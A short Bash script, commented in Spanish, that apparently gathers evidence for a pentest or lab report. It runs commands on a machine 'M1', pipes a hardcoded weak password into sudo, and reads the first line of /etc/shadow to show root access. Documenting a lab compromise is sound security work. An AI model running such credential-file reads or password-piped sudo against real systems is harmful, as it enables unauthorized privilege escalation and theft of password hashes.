#!/usr/bin/env bash
# m1-root.sh — evidencia de ROOT en M1 por credenciales débiles + sudo.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

echo "== M1: usuario y elevacion =="
./informe/tools/vm.sh m1 '
hostname
echo -n "usuario: "; id
echo -n "sudo:    "; echo "Admin13.-" | sudo -S id 2>/dev/null
echo "--- primera linea de /etc/shadow (prueba de root) ---"
echo "Admin13.-" | sudo -S head -1 /etc/shadow 2>/dev/null
'
